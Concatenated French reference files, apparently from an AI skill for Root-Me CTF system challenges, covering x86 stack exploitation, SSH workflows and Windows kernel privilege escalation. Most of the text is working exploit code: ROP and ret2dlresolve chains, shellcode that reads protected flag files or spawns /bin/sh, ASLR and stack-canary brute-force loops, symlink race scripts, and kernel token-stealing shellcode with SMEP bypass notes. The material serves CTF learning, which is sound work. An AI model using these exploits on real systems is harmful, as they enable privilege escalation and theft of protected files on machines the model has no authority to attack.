# Après crash : x/x $eip → valeur EIP corrompue
python3 -c "from pwn import *; print(cyclic_find(0x61616164))"

# Méthode 3 : binary search manuelle
python3 -c "print('A'*76 + 'BBBB')" | ./challenge  # EIP = 0x42424242 ?
```

## ret2dlresolve 32-bit (sans libc leak)

```python
from pwn import *
elf = ELF('./challenge')
rop = ROP(elf)

# Créer payload ret2dlresolve
dlresolve = Ret2dlresolvePayload(elf, symbol="system", args=["/bin/sh"])
rop.read(0, dlresolve.data_addr, len(dlresolve.payload))
rop.ret2dlresolve(dlresolve)

raw_rop = rop.chain()
offset = 76
payload = fit({offset: raw_rop}, length=offset+len(raw_rop))
io.sendline(payload)
io.send(dlresolve.payload)
io.interactive()
```

## Techniques de bypass 32-bit

### ASLR Brute-force (32-bit seulement)

```python
# En 32-bit, seulement ~256 valeurs possibles pour l'adresse de base de la pile
# Brute-force possible sur serveur forking

for i in range(256):
    io = process('./challenge')
    # Tenter avec adresse fixe supposée
    payload = b'A' * offset + p32(stack_guess)
    io.sendline(payload)
    try:
        io.recv(timeout=0.5)
        print("SUCCESS!")
        io.interactive()
        break
    except:
        io.close()
```

### ASLR par-processus sur Root-Me (piège critique)

**Symptôme** : le scan trouve l'adresse du buffer, mais l'exploit échoue à chaque fois.

**Cause** : Sur les serveurs Root-Me, `setarch i386 -R` ne désactive PAS entièrement l'ASLR de la pile. L'adresse du buffer est re-randomisée à chaque exécution du binaire (entropie ~1,6 Mo observée). Même au sein d'un même script bash, chaque `subprocess.run()` ou fork donne une adresse différente.

**Règle absolue** : Scan et exploit doivent se produire dans **le même processus**. Ne jamais chercher l'adresse dans un appel et l'exploiter dans un autre.

**Solution : shellcode combiné scan+exploit**

```python
# Shellcode qui fait TOUT en une seule exécution :
# 1. Écrit ESP sur stdout (preuve d'exécution + adresse)
# 2. Ouvre le fichier flag
# 3. Lit le flag
# 4. Écrit le flag sur stdout
# 5. Exit

# i386, 32-bit, syscalls int 0x80
sc = bytes([
    # Part 1 : écrire ESP (4 octets) sur stdout
    0x54,             # push esp
    0x89, 0xe1,       # mov ecx, esp   (pointe vers la valeur ESP empilée)
    0x6a, 0x04, 0x5a, # push 4; pop edx
    0x6a, 0x01, 0x5b, # push 1; pop ebx (stdout)
    0x6a, 0x04, 0x58, # push 4; pop eax (sys_write=4)
    0xcd, 0x80,       # int 0x80
    # Part 2 : ouvrir le fichier (chemin empilé en reverse dwords)
    # [push du chemin complet en dwords little-endian, reversed]
    # ex: "/challenge/app-systeme/ch21/.passwd\0" en 9 dwords
    0x89, 0xe3,       # mov ebx, esp  (ptr vers le chemin)
    0x31, 0xc9,       # xor ecx, ecx  (O_RDONLY=0)
    0x31, 0xd2,       # xor edx, edx
    0x6a, 0x05, 0x58, 0xcd, 0x80,  # push 5; pop eax; int 0x80 -> sys_open
    # Part 3 : lire
    0x89, 0xc3,       # mov ebx, eax  (fd)
    0x83, 0xec, 0x40, # sub esp, 64
    0x89, 0xe1,       # mov ecx, esp
    0x6a, 0x40, 0x5a, # push 64; pop edx
    0x6a, 0x03, 0x58, 0xcd, 0x80,  # sys_read
    # Part 4 : écrire sur stdout
    0x89, 0xc2,       # mov edx, eax (bytes_read)
    0x89, 0xe1,       # mov ecx, esp
    0x6a, 0x01, 0x5b, # push 1; pop ebx (stdout)
    0x6a, 0x04, 0x58, 0xcd, 0x80,  # sys_write
    # Part 5 : exit
    0x31, 0xdb,       # xor ebx, ebx
    0x6a, 0x01, 0x58, 0xcd, 0x80,  # sys_exit(0)
])
```

**Stratégie de scan avec shellcode combiné** (depuis bash) :

```bash
#!/bin/bash
B='/path/to/setuid/binary'
N=-1869574000  # 0x90909090 NOP

# Générer le fichier exploit (base fixe) avec awk
awk -v n="$N" -v sc="$COMBINED_CHUNKS" 'BEGIN{
    for(i=1;i<996;i++){print n; print i}
    nsc=split(sc,a," ")
    for(j=1;j<=nsc;j++){if(a[j]+0!=0){print a[j]; print 995+j}}
}' > /tmp/base.txt

# Boucle de brute-force ASLR : ~400 essais en moyenne (sled 4KB, range ~1,6MB)
addr=4294963200  # 0xFFFFF000
cnt=0
while [ $cnt -lt 5000 ]; do
    if [ $addr -gt 2147483647 ]; then rd=$((addr-4294967296)); else rd=$addr; fi
    { cat /tmp/base.txt; printf '%d\n-15\n' $rd; } > /tmp/ew.txt
    timeout 2 setarch i386 -R "$B" /tmp/ew.txt > /tmp/out.bin 2>/dev/null
    cnt=$((cnt+1))
    sz=$(wc -c < /tmp/out.bin 2>/dev/null | tr -d ' ')
    sz=${sz:-0}
    if [ "$sz" -gt 4 ]; then          # >4 octets = ESP (4B) + flag
        dd if=/tmp/out.bin bs=1 skip=4 2>/dev/null; echo; break
    elif [ "$sz" -eq 4 ]; then         # =4 octets = exécution OK mais fichier inaccessible
        echo "[EXEC mais pas de flag - problème setuid ?]"
    fi
    addr=$((addr - 3840))
    [ $addr -lt 4278190080 ] && addr=4294963200  # wrap around
done
```

**Diagnostic de l'exécution du shellcode** :

```python
# Shellcode "write-ESP" : confirme que le shellcode tourne ET donne l'adresse
# push esp; mov ecx,esp; push4; pop edx; push1; pop ebx; push4; pop eax; int80; push1; pop eax; xor ebx,ebx; int80
ESP_SC_BYTES = bytes([
    0x54, 0x89, 0xe1, 0x6a, 0x04, 0x5a,
    0x6a, 0x01, 0x5b, 0x6a, 0x04, 0x58,
    0xcd, 0x80,
    0x31, 0xdb, 0x6a, 0x01, 0x58, 0xcd, 0x80,
])
# Si sortie = 4 octets → ESP = struct.unpack('<I', out[:4])[0]
# buf_addr = ESP + 0x38 (vérifier avec Ghidra/r2)

# Interprétation des résultats :
# sz=0  → redirect rate la NOP sled (SIGSEGV) → continuer le scan
# sz=4  → shellcode tourne MAIS sys_open échoue (EACCES ? setuid KO ?)
# sz>4  → shellcode tourne ET flag lu avec succès
```

**Contrainte "pas de dword nul"** dans les primitives d'écriture arbitraire :

```python
# Certains binaires skippent les paires (VALUE, INDEX) si VALUE == 0.
# S'assurer que TOUS les chunks du shellcode sont non-nuls :

import struct
chunks = [struct.unpack('<i', sc[i:i+4])[0] for i in range(0, len(sc), 4)]
zeros = [(i, v) for i, v in enumerate(chunks) if v == 0]
# Si zeros non-vide → réécrire les instructions concernées :
# push 0; pop ebx  → xor ebx, ebx  (évite le chunk 0x5b006a00)
# push 0x00...    → xor eax,eax; push eax (si nécessaire)
```

### Serveur forking : canary brute-force byte par byte

```python
canary = b'\x00'  # Toujours commence par \x00

for byte_idx in range(1, 4):  # 3 octets restants (32-bit canary = 4 bytes)
    for byte_val in range(256):
        io = remote(HOST, PORT)
        payload = b'A' * offset + canary + bytes([byte_val])
        io.sendline(payload)
        response = io.recv(timeout=0.5)
        if b'*** stack smashing' not in response:
            canary += bytes([byte_val])
            break
        io.close()
```

## Race condition (Root-Me classique)

```bash
# Pattern typique : programme vérifie un fichier, puis l'ouvre → TOCTOU
# Exploit : créer/supprimer le fichier en boucle pendant que le prog accède

# Script bash race
while true; do
    ln -sf /challenge/.passwd /tmp/target &
    rm /tmp/target &
done &
# Lancer le programme en parallèle

# Python race avec threads
import threading, os, time

def swap():
    while True:
        os.symlink('/challenge/.passwd', '/tmp/file')
        os.remove('/tmp/file')

t = threading.Thread(target=swap, daemon=True)
t.start()
# Lancer le binaire en boucle
```

## Syscalls 32-bit (int 0x80)

```python
# Quand seccomp bloque les syscalls 64-bit
# int 0x80 utilise des numéros différents !
# x86 32-bit syscall table
SYSCALL_READ  = 3
SYSCALL_WRITE = 4
SYSCALL_OPEN  = 5
SYSCALL_EXECVE = 11

shellcode_32 = asm('''
    xor eax, eax
    push eax
    push 0x68732f2f  ; //sh
    push 0x6e69622f  ; /bin
    mov ebx, esp
    xor ecx, ecx
    xor edx, edx
    mov eax, 11      ; execve
    int 0x80
''', arch='i386')
```

## Gadgets ROPgadget 32-bit

```bash
# Lister les gadgets utiles
ROPgadget --binary ./challenge --rop | grep "pop ebx"
ROPgadget --binary ./challenge --rop | grep "int 0x80"
ROPgadget --binary ./challenge --rop | grep "call system"

# Gadgets classiques en 32-bit
# pop ebx; ret       → contrôler 1er arg
# pop ecx; pop ebx; ret  → 2ème et 1er arg
# int 0x80; ret      → syscall
# leave; ret         → stack pivot
```

## Protections Root-Me x86 typiques

```bash
# Challenges basiques (pas de protection)
checksec --file=challenge
# Arch: i386-32-little | RELRO: No RELRO | Stack: No canary | NX: NX disabled | PIE: No PIE

# Challenges intermédiaires
# RELRO: Partial RELRO | Stack: No canary | NX: NX enabled | PIE: No PIE

# Challenges avancés
# RELRO: Full RELRO | Stack: Canary found | NX: NX enabled | PIE: PIE enabled
```



---

<!-- Source: quickref.md -->

# ctf-app-system — Quick Reference

Inline code / one-liners / common payloads. Loaded on demand from `SKILL.md`. Detailed techniques live in the category-specific support files listed in `SKILL.md`.


## Reconnaissance initiale

```bash
# 1. Connexion SSH Root-Me
ssh -p 2222 <user>@<challenge>.root-me.org

# 2. Sur le serveur : identifier l'environnement
uname -a                          # kernel version
ldd --version                     # libc version
ls -la /challenge/ 2>/dev/null || ls ~
file ./challenge                  # architecture + linking
checksec --file=./challenge       # protections

# 3. Récupérer le binaire en local
scp -P 2222 user@host:~/challenge ./
# Ou depuis l'interface Root-Me (téléchargement direct)
```

## Stratégie selon les protections

| PIE | RELRO | Canary | NX | Stratégie |
|-----|-------|--------|----|-----------|
| Non | Partial | Non | Non | Shellcode ou ret2win direct (adresses fixes) |
| Non | Partial | Non | Oui | GOT overwrite via fmt string ou ret2libc |
| Non | Full | Oui | Oui | Leak canary via fmt string → ROP ret2libc |
| Oui | Full | Oui | Oui | Leak PIE+libc via fmt string → ROP |
| Oui | Full | Oui | Oui | Heap UAF → leak → tcache poison |

## Déterminer le type de vuln

```bash
# Analyser statiquement
objdump -d ./challenge | grep -A5 "gets\|scanf\|strcpy\|printf\|fgets"
strings ./challenge | grep -E "Enter|Input|Name|Message"

# Comportement à chaud (local)
python3 -c "print('A'*200)" | ./challenge   # crash = overflow
python3 -c "print('%p.'*30)" | ./challenge  # leak = format string

# Ghidra / radare2 pour la décompilation
r2 -A ./challenge
pdf @ main
```

## Workflow de résolution Root-Me

1. **Analyse statique locale** — `checksec`, `file`, Ghidra/r2, `strings`
2. **Identifier la vuln** — overflow, format string, UAF, race
3. **Fingerprint libc remote** — `ldd`, `strings /lib/x86_64-linux-gnu/libc.so.6 | grep GLIBC`, ou `libc-database`
4. **Patcher le binaire local** — `patchelf` pour matcher la libc du serveur
5. **Développer l'exploit localement** — avec `process()` pwntools
6. **Switcher sur `remote()`** — ou transférer via SSH + exécuter
7. **Récupérer le flag** — `/passwd`, `/home/user/.passwd`, `/challenge/.passwd`

## Emplacement du flag sur Root-Me

```bash
# Emplacements classiques Root-Me
cat /challenge/.passwd
cat ~/.passwd
find / -name ".passwd" 2>/dev/null
cat /passwd  # rare
```

## Outils essentiels

```bash
# Installation rapide si manquant
pip install pwntools
pip install ROPgadget
pip install one_gadget  # ou gem install one_gadget

# Commandes clés
checksec --file=./binary
ROPgadget --binary ./binary --rop | grep "pop rdi"
one_gadget ./libc.so.6
strings ./libc.so.6 | grep "GLIBC_"
objdump -d ./binary | grep -A3 "<puts@plt>"
readelf -s ./libc.so.6 | grep " system"
```

## Template pwntools universel

```python
from pwn import *

# Configuration
elf = ELF('./challenge')
libc = ELF('./libc.so.6')  # libc locale patché
context.arch = 'amd64'     # ou 'i386' ou 'aarch64'
context.log_level = 'debug'

# Local vs remote
LOCAL = False
if LOCAL:
    io = process('./challenge')
    # io = process(['./challenge'], env={"LD_PRELOAD": "./libc.so.6"})
else:
    io = remote('challenge01.root-me.org', 2222)
    # ou via SSH : io = ssh('user', 'host', port=2222).process('./challenge')

# GDB attach (local seulement)
if LOCAL and args.GDB:
    gdb.attach(io, '''
        break *main+42
        continue
    ''')

# === EXPLOIT ===

io.interactive()
```

Voir les fichiers spécialisés pour les techniques par architecture.



---

<!-- Source: rootme-ssh.md -->

# Root-Me App-System — Workflow SSH et Environnement Remote

## Connexion aux challenges Root-Me

```bash
# Format de connexion Root-Me app-system
ssh -p 2222 app-systeme-ch0@challenge01.root-me.org
# Le mot de passe est souvent "app-systeme-ch0" (même que le user)

# Ou avec clé SSH (profil Root-Me → SSH Keys)
ssh -i ~/.ssh/rootme_key -p 2222 app-systeme-ch12@challenge01.root-me.org

# Challenges récents : port peut varier
ssh -p 2223 user@ctf.root-me.org
```

## Identifier la libc du serveur

```bash
# Méthode 1 : directement sur le serveur
ldd ./challenge
# → libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x...)
strings /lib/x86_64-linux-gnu/libc.so.6 | grep "GNU C Library"
# → GNU C Library (Ubuntu GLIBC 2.31-13ubuntu11) stable release version 2.31

# Méthode 2 : libc-database (local, après avoir les offsets)
# https://libc.blukat.me/ ou https://libc.rip/
# Donner : puts offset, system offset → identifie la libc

# Méthode 3 : télécharger la libc du serveur
scp -P 2222 user@host:/lib/x86_64-linux-gnu/libc.so.6 ./remote_libc.so.6
scp -P 2222 user@host:/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2 ./remote_ld.so.2

# Méthode 4 : printf dans le binaire pour leaker
python3 -c "
from pwn import *
# Leak adresse puts@got, calculer offset dans libc
# puts_offset = libc.symbols['puts']
# libc_base = puts_leak - puts_offset
# system = libc_base + libc.symbols['system']
"
```

## Patcher le binaire local pour matcher la libc remote

```bash
# patchelf : forcer le binaire à utiliser une libc spécifique localement
patchelf --set-interpreter ./remote_ld.so.2 ./challenge
patchelf --replace-needed libc.so.6 ./remote_libc.so.6 ./challenge

# Vérifier
ldd ./challenge
# → libc.so.6 => ./remote_libc.so.6

# Avec LD_PRELOAD (alternative sans modifier le binaire)
LD_PRELOAD=./remote_libc.so.6 ./challenge
```

## Transférer et exécuter un exploit via SSH

```bash
# Méthode 1 : scp + exécution
scp -P 2222 exploit.py user@host:~/
ssh -p 2222 user@host "python3 ~/exploit.py"

# Méthode 2 : stdin pipe (pour exploits simples)
python3 -c "import sys; sys.stdout.buffer.write(b'A'*100 + b'\xef\xbe\xad\xde')" \
  | ssh -p 2222 user@host "./challenge"

# Méthode 3 : pwntools SSH (recommandé pour interactif)
from pwn import *
shell = ssh('app-systeme-ch12', 'challenge01.root-me.org', port=2222, 
            password='app-systeme-ch12')
io = shell.process('./challenge')
# ... exploit ...
io.interactive()

# Méthode 4 : heredoc pour transférer code inline
ssh -p 2222 user@host 'cat > /tmp/exploit.py << '"'"'EOF'"'"'
from pwn import *
io = process("./challenge")
io.sendline(b"A"*100)
print(io.recvall())
EOF
python3 /tmp/exploit.py'
```

## Résoudre les contraintes remote (pas de pwntools installé)

```bash
# Vérifier les outils disponibles sur le serveur
which python3 python perl ruby nc socat

# Si pwntools absent : exploit en C compilé localement, transféré
# Compiler un exploit C statiquement
gcc -static -o exploit exploit.c
scp -P 2222 exploit user@host:~/tmp/
ssh -p 2222 user@host "./tmp/exploit"

# Exploit bash minimaliste
python3 -c "print('A'*72 + '\xef\xbe\xad\xde')" | ./challenge

# Exploit avec /proc/self/maps pour ASLR leak (si /proc accessible)
cat /proc/self/maps
```

## Contraintes mémoire serveur Root-Me (CRITIQUE)

**Symptôme** : `python3 exploit.py` échoue avec `MemoryError` ou `Killed` dès l'import de modules.

**Cause** : Les serveurs Root-Me sont des environnements multi-utilisateur contraints en RAM. Même `python3 -S` peut OOM car importer `subprocess` charge `threading → traceback → tokenize → collections`, chain très lourde.

**Règle** : Ne jamais importer de module complexe dans un script Python lancé sur le serveur. Préférer bash+awk.

```bash
# BAD : échoue sur le serveur même avec -S
python3 -S -c "import subprocess; subprocess.run(['./challenge'])"

# GOOD : bash+awk = empreinte mémoire minimale
awk 'BEGIN{ for(i=0;i<100;i++) print -1869574000; print i }' > /tmp/input.txt
./challenge /tmp/input.txt

# Génération rapide de fichier exploit avec awk
awk -v n="$NOP_VAL" -v sc="$SC_CHUNKS" 'BEGIN{
    for(i=1;i<996;i++){print n; print i}       # NOP sled
    nsc=split(sc,a," ")
    for(j=1;j<=nsc;j++){print a[j]; print 995+j}  # shellcode
}' > /tmp/exploit_base.txt
```

## Pilotage SSH depuis local avec paramiko (quand Python OOM sur le serveur)

**Architecture** : Python+paramiko tourne en **local**, le serveur n'exécute que des commandes bash légères.

```python
import paramiko, time

ssh = paramiko.SSHClient()
ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
ssh.connect('challenge03.root-me.org', port=2223, username='app-systeme-ch21',
            password='app-systeme-ch21', timeout=30)
ssh.get_transport().set_keepalive(20)  # évite timeout inactif

# Uploader le script bash exploit
sftp = ssh.open_sftp()
sftp.put('/tmp/exploit.sh', '/tmp/exploit.sh')
sftp.chmod('/tmp/exploit.sh', 0o755)
sftp.close()

# UN SEUL exec_command pour tout le scan (voir limite canaux ci-dessous)
chan = ssh.get_transport().open_session()
chan.exec_command('bash /tmp/exploit.sh 2>&1')

# Streamer la sortie
while True:
    if chan.recv_ready():
        print(chan.recv(4096).decode('utf-8', errors='replace'), end='', flush=True)
    if chan.exit_status_ready():
        # Vider le buffer restant
        while chan.recv_ready():
            print(chan.recv(4096).decode('utf-8', errors='replace'), end='', flush=True)
        break
    time.sleep(0.1)
```

**Limite critique : canaux SSH par session**. Les serveurs Root-Me ferment la session après ~50 `exec_command`. Ne jamais boucler `exec_command` en Python — le canal se ferme avec "Channel closed".

```python
# BAD : channel closed après ~50 itérations
for addr in range(0xFFFFF000, 0xFF000000, -3840):
    chan = ssh.get_transport().open_session()  # échoue vite
    chan.exec_command(f'./challenge /tmp/input_{addr}.txt')

# GOOD : UNE exec_command lance un script bash qui boucle en interne
chan.exec_command('bash /tmp/scan_loop.sh 2>&1')
# Le bash loop tourne pendant des heures sans ouvrir de nouveaux canaux
```

## Variable SSH_CLIENT et impact sur le stack layout

**Observation** : La variable d'environnement `SSH_CLIENT` est définie par connexion TCP. Elle contient `"IP PORT 22"` et occupe de l'espace sur la pile. Changer la connexion SSH change l'adresse du buffer en 32-bit.

**Implication** : Si le scan est fait dans une connexion paramiko et l'exploit dans une autre, les adresses peuvent différer même si ASLR était fixe.

**Règle** : Toujours garder le MÊME objet `ssh` (même session TCP) entre le scan et l'exploit. Encore mieux : utiliser le shellcode combiné (voir elf-x86.md) qui scanne et exploite dans le même sous-processus.

```python
# Même connexion SSH pour toute la durée de l'exploit
ssh = paramiko.SSHClient()
ssh.connect(...)
ssh.get_transport().set_keepalive(20)

# Ne pas fermer/rouvrir la connexion entre le scan et l'exploit
# car SSH_CLIENT change → stack layout change → adresses différentes
```

## Script bash de scan ASLR optimal (serveur Root-Me 32-bit)

Template complet pour une boucle de brute-force ASLR robuste sur le serveur :

```bash
#!/bin/bash
B='/challenge/app-systeme/chXX/chXX'  # binaire setuid
N=-1869574000  # valeur NOP (0x90909090 signé 32-bit)
SC_CHUNKS='...'  # chunks int32 du shellcode (séparés par espaces)

# Construire le fichier de base une seule fois
awk -v n="$N" -v sc="$SC_CHUNKS" 'BEGIN{
    for(i=1;i<996;i++){print n; print i}         # sled 4000 octets
    nsc=split(sc,a," ")
    for(j=1;j<=nsc;j++){
        if(a[j]+0!=0){print a[j]; print 995+j}   # ignorer chunks=0
    }
}' > /tmp/base.txt

cnt=0; addr=4294963200  # 0xFFFFF000, scan vers le bas

while [ $cnt -lt 20000 ]; do
    # Conversion en signé 32-bit pour bash arithmetic
    if [ $addr -gt 2147483647 ]; then rd=$((addr-4294967296)); else rd=$addr; fi

    # Ajouter le vecteur de redirection (index -15 = retour de insert)
    { cat /tmp/base.txt; printf '%d\n-15\n' $rd; } > /tmp/exploit.txt

    timeout 2 setarch i386 -R "$B" /tmp/exploit.txt > /tmp/out.bin 2>/dev/null
    cnt=$((cnt+1))
    sz=$(wc -c < /tmp/out.bin 2>/dev/null | tr -d ' '); sz=${sz:-0}

    if [ "$sz" -gt 4 ]; then
        printf '[FLAG! cnt=%d addr=0x%08x sz=%d]\n' $cnt $addr $sz
        dd if=/tmp/out.bin bs=1 skip=4 count=$((sz-4)) 2>/dev/null
        printf '\n'; exit 0
    elif [ "$sz" -eq 4 ]; then
        printf '[EXEC-ONLY cnt=%d addr=0x%08x]\n' $cnt $addr  # shellcode tourne mais pas de flag
    fi

    addr=$((addr - 3840))
    [ $addr -lt 4278190080 ] && addr=4294963200  # wrap 0xFF000000 → 0xFFFFF000

    [ $((cnt % 100)) -eq 0 ] && printf '[scan] cnt=%d addr=0x%08x\n' $cnt $addr >&2
done
printf '[FAILED after %d tries]\n' $cnt
```

**Interprétation des tailles de sortie** :
- `sz=0` → SIGSEGV : redirection rate la NOP sled (continuer le scan)
- `sz=4` → Shellcode exécuté (ESP écrit), mais sys_open/sys_read/sys_write échoue (vérifier permissions setuid, chemin du fichier)
- `sz>4` → Succès : 4B ESP + contenu du flag

## Environnement serveur typique Root-Me

```bash
# Ce qui est généralement disponible
python3          # pwntools souvent absent
gcc              # pour compiler des exploits C
gdb              # parfois disponible, souvent absent
strings, file    # binutils
ltrace, strace   # parfois
nc, socat        # réseau

# Binaire challenge souvent dans :
~/                          # home directory
/challenge/                 # dossier dédié
/levels/<nom>/              # ancienne structure

# Flag généralement dans :
/challenge/.passwd
~/.passwd
/passwd
```

## Fingerprinter la libc avec des leaks

```python
from pwn import *

# Après avoir leaké une adresse libc (ex: puts@got)
puts_leak = 0x7f1234567890

# Méthode 1 : libc-database locale
# git clone https://github.com/niklasb/libc-database
# ./add /path/to/libc.so.6
# ./find puts 0x890  (3 derniers hex de l'offset)

# Méthode 2 : libc.rip API
import requests
r = requests.post('https://libc.rip/api/find', json={
    'symbols': {'puts': hex(puts_leak & 0xfff)}
})
print(r.json())

# Méthode 3 : pwntools DynELF (si read primitive disponible)
def leak(addr):
    # ... exploit pour lire addr ...
    return data
d = DynELF(leak, elf=elf)
system_addr = d.lookup('system', 'libc')
```

## Debugging local sans GDB interactif

```bash
# Trouver offset avec pattern cyclic
python3 -c "from pwn import *; print(cyclic(200).decode())" | ./challenge
# Après segfault : dmesg | tail ou /var/log/syslog pour voir l'adresse de crash
dmesg | tail -5
# → challenge[1234]: segfault at 6161616e ip 6161616e sp ...
python3 -c "from pwn import *; print(cyclic_find(0x6161616e))"

# GDB one-shot (sans pwntools gdb.attach)
echo "r <<< $(python3 -c "from pwn import *; sys.stdout.buffer.write(cyclic(200))")" | \
  gdb -q ./challenge
# Dans gdb : info registers, x/20x $rsp

# Valgrind pour UAF/heap bugs
valgrind --track-origins=yes ./challenge <<< "$(python3 -c "print('A'*100)")"

# ASAN build local pour confirmer vuln
gcc -fsanitize=address -o challenge_asan challenge.c
```

## One_gadget : trouver des gadgets shell directs

```bash
# Lister les gadgets one_shot dans la libc
one_gadget ./libc.so.6
# → Offsets avec conditions (rax==null, [rsp+0x30]==null, etc.)

# Avec la libc remote
one_gadget ./remote_libc.so.6

# En Python
from subprocess import check_output
gadgets = check_output(['one_gadget', '--raw', 'libc.so.6']).split()
# gadgets = [int(x, 16) for x in gadgets]
```

## Offsets utiles à connaître

```python
# Calculer l'offset d'un symbole dans libc
from pwn import *
libc = ELF('./libc.so.6')
print(hex(libc.symbols['system']))     # offset de system
print(hex(libc.symbols['__libc_start_main']))
print(next(libc.search(b'/bin/sh')))   # offset de /bin/sh

# Après leak d'une adresse libc connue :
libc_base = leaked_addr - libc.symbols['puts']
system = libc_base + libc.symbols['system']
binsh = libc_base + next(libc.search(b'/bin/sh'))
```



---

<!-- Source: winkern-x64.md -->

# CTF App-System — Windows Kernel x64

## Vue d'ensemble des challenges WinKern Root-Me

Les challenges Windows Kernel Root-Me fournissent généralement :
- Un driver kernel vulnérable (`.sys`)
- Un programme de test ou interface IOCTL
- Accès à une VM Windows via RDP ou fichier challenge à analyser

**Objectif** : escalade de privilèges → SYSTEM → lire le flag.

## Structures Windows Kernel essentielles

### _EPROCESS (Process Control Block)

```c
// Offsets clés (Windows 10 1909, varient selon version)
_EPROCESS:
  +0x000 Pcb              : _KPROCESS
  +0x2e0 UniqueProcessId  : HANDLE    // PID du process
  +0x2e8 ActiveProcessLinks: LIST_ENTRY // Liste doublement chaînée de tous les process
  +0x358 Token            : _EX_FAST_REF // Token de sécurité du process
  // Token encodé : valeur & ~0xF = adresse réelle
```

```python
# Offsets courants à vérifier selon la version Windows
# Windows 10 1809 : ActiveProcessLinks=+0x2f0, Token=+0x360
# Windows 10 1909 : ActiveProcessLinks=+0x2e8, Token=+0x358
# Windows 10 21H1 : ActiveProcessLinks=+0x448, Token=+0x4b8
# Windows 11     : ActiveProcessLinks=+0x448, Token=+0x4b8

# Vérifier avec WinDbg :
# dt nt!_EPROCESS
# dt nt!_EPROCESS @$proc
```

## Token Stealing — Technique principale

```c
// Exploit en C pour token stealing (intégré dans l'exploit userland)
#include <windows.h>
#include <stdio.h>

// Cette fonction est exécutée en kernel context (via shellcode ou ROP)
void __fastcall steal_token() {
    ULONG_PTR eprocess_offset_pid    = 0x2e0;  // UniqueProcessId
    ULONG_PTR eprocess_offset_list   = 0x2e8;  // ActiveProcessLinks
    ULONG_PTR eprocess_offset_token  = 0x358;  // Token

    // 1. Obtenir le KPROCESS courant via nt!PsGetCurrentProcess (ou GS segment)
    // En shellcode kernel : __readgsqword(0x188) → KTHREAD → Process
    
    // 2. Parcourir la liste des process pour trouver SYSTEM (PID=4)
    ULONG_PTR current = (ULONG_PTR)PsGetCurrentProcess();
    ULONG_PTR system_proc = current;
    
    do {
        ULONG_PTR pid = *(ULONG_PTR*)(system_proc + eprocess_offset_pid);
        if (pid == 4) break;  // SYSTEM process
        ULONG_PTR flink = *(ULONG_PTR*)(system_proc + eprocess_offset_list);
        system_proc = flink - eprocess_offset_list;
    } while (system_proc != current);
    
    // 3. Copier le token SYSTEM vers le process courant
    ULONG_PTR system_token = *(ULONG_PTR*)(system_proc + eprocess_offset_token);
    *(ULONG_PTR*)(current + eprocess_offset_token) = system_token;
}
```

### Shellcode token stealing (x64)

```python
# Shellcode assembleur pour token stealing en kernel x64
from pwn import *

# Windows 10 1909 offsets
EPROCESS_PID_OFFSET   = 0x2e0
EPROCESS_LIST_OFFSET  = 0x2e8
EPROCESS_TOKEN_OFFSET = 0x358

shellcode = asm(f'''
    ; Sauvegarder les registres
    push rax
    push rbx
    push rcx
    push rdx
    
    ; Obtenir _EPROCESS courant via KTHREAD (GS:[0x188])
    mov rax, qword ptr gs:[0x188]    ; CurrentThread
    mov rax, qword ptr [rax + 0x70]  ; Process (_KPROCESS)
    mov rax, qword ptr [rax + 0x220] ; _EPROCESS (si KPROCESS en premier)
    ; Note: peut varier, parfois directement gs:[0x188]+offset
    
    ; Sauvegarder l'_EPROCESS courant
    mov rdx, rax
    
    ; Parcourir ActiveProcessLinks pour trouver SYSTEM (PID=4)
loop_start:
    mov rax, [rax + {EPROCESS_LIST_OFFSET}]  ; flink
    sub rax, {EPROCESS_LIST_OFFSET}           ; retour au début de EPROCESS
    cmp qword ptr [rax + {EPROCESS_PID_OFFSET}], 4  ; PID == SYSTEM ?
    jne loop_start
    
    ; Copier token SYSTEM vers process courant
    mov rbx, [rax + {EPROCESS_TOKEN_OFFSET}] ; Token du SYSTEM
    mov [rdx + {EPROCESS_TOKEN_OFFSET}], rbx  ; Overwrite notre token
    
    ; Restaurer registres
    pop rdx
    pop rcx
    pop rbx
    pop rax
    ret
''', arch='amd64', os='windows')
```

## Interface IOCTL (DeviceIoControl)

```c
// Pattern typique d'un challenge kernel Windows
// Le driver expose un device \\\\.\\VulnDriver
// Interaction via DeviceIoControl

#include <windows.h>

int main() {
    // Ouvrir le device
    HANDLE hDevice = CreateFileA(
        "\\\\.\\VulnDriver",      // Nom du device
        GENERIC_READ | GENERIC_WRITE,
        FILE_SHARE_READ | FILE_SHARE_WRITE,
        NULL,
        OPEN_EXISTING,
        FILE_ATTRIBUTE_NORMAL,
        NULL
    );
    if (hDevice == INVALID_HANDLE_VALUE) {
        printf("[-] Impossible d'ouvrir le device: %d\n", GetLastError());
        return 1;
    }
    
    // Envoyer une requête IOCTL
    DWORD bytesReturned;
    char inputBuffer[1024] = {0};
    char outputBuffer[1024] = {0};
    
    // IOCTL_CODE varie selon le challenge
    DeviceIoControl(hDevice, IOCTL_CODE, 
                    inputBuffer, sizeof(inputBuffer),
                    outputBuffer, sizeof(outputBuffer),
                    &bytesReturned, NULL);
    
    CloseHandle(hDevice);
}
```

## Pool Overflow Exploitation

```c
// Non-Paged Pool overflow → corrompre un objet adjacent
// Technique : spray + overflow + use after free ou vtable corruption

// 1. Spray avec des objets connus (même taille que la cible)
for (int i = 0; i < 1000; i++) {
    // Créer des Named Pipes ou Events pour occuper le pool
    HANDLE hPipe = CreateNamedPipeA(...);  // kmalloc-style allocation
}

// 2. Créer l'objet vulnérable
HANDLE hVuln = CreateFile("\\\\.\\VulnDev", ...);

// 3. Overflow → corrompre l'objet adjacent
DeviceIoControl(hVuln, IOCTL_OVERFLOW, 
                overflow_data, sizeof(overflow_data), ...);

// 4. Trigger la corruption (appeler la méthode corrompue)
// Ex: écriture dans le pipe va appeler vtable corrompue
WriteFile(hCorruptedPipe, data, sizeof(data), &bytes, NULL);
```

## SMEP Bypass pour Windows Kernel

```c
// SMEP (Supervisor Mode Execution Prevention) : 
// Le kernel ne peut pas exécuter du code en espace user

// Méthode 1 : ROP kernel uniquement (pas de shellcode userland)
// Toute l'exploitation reste dans le kernel via gadgets ROP

// Méthode 2 : Modifier CR4 (si possible)
// CR4.SMEP = bit 20 → mettre à 0 pour désactiver SMEP
// Gadget : mov cr4, rax avec rax = cr4_val & ~(1<<20)

// Méthode 3 : Utiliser des pages kernel exécutables
// Trouver une région kernel RWX (rare sur Windows moderne)

// Méthode 4 : Retour vers un gadget kernel qui appelle code userland
// Via pointeur de stack kernel qui pointe vers userland

